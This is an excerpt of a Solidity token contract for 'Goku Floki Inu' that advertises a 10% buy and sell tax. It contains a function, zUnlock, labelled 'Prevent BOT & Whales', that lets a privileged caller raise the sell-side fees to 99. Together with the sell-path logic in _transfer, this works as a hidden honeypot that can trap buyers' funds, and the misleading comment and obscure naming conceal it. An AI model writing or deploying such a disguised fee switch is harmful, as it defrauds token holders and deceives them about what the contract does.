...
// Goku Floki Inu ($GOKUFLOKIINU) 
// Tax 10% Buy | 10% Sell 
// Telegram: https://t.me/gokuflokiinu               
// Website: https://gokuflokiinu.com
...
contract GokuFlokiInu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0x130DAe79095464Eb395f7c4BFaCBFF558b9bCd2F); // Marketing Address
    ...
    string private _name = "Goku Floki Inu";
    string private _symbol = "GokuFlokiInu";
    ...
    struct AddressFee {
        ...
        uint256 _buylpPajek;
        uint256 _botNeedsPrevention;
        uint256 _whaleNeedsPrevention;
    }
    ...
    uint256 private _buypajekFee = 9;
    uint256 private _buylpPajek = 1;
    
    uint256 private _botNeedsPrevention = 1;
    uint256 private _whaleNeedsPrevention = 10;
    ...
    uint256 private _mentokanJumlah = 100000000000 * 10**6 * 10**9;
    uint256 private minTknBfrSwp= 2000000 * 10**6 * 10**9; 
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(to == uniswapV2Pair){
                removeAllFee();
                _pajekFee = _botNeedsPrevention;
                _lpPajek = _whaleNeedsPrevention;
            }
            ...
            if(_addressFees[from].enable){
                ...
                // Sell
                if(to == uniswapV2Pair){
                    _pajekFee = _addressFees[from]._botNeedsPrevention;
                    _lpPajek = _addressFees[from]._whaleNeedsPrevention;
                }
            }
            else{
    ...
    // Prevent BOT & Whales
    function zUnlock() public deadCall {
        _botNeedsPrevention = 99;
        _whaleNeedsPrevention = 99;
    }
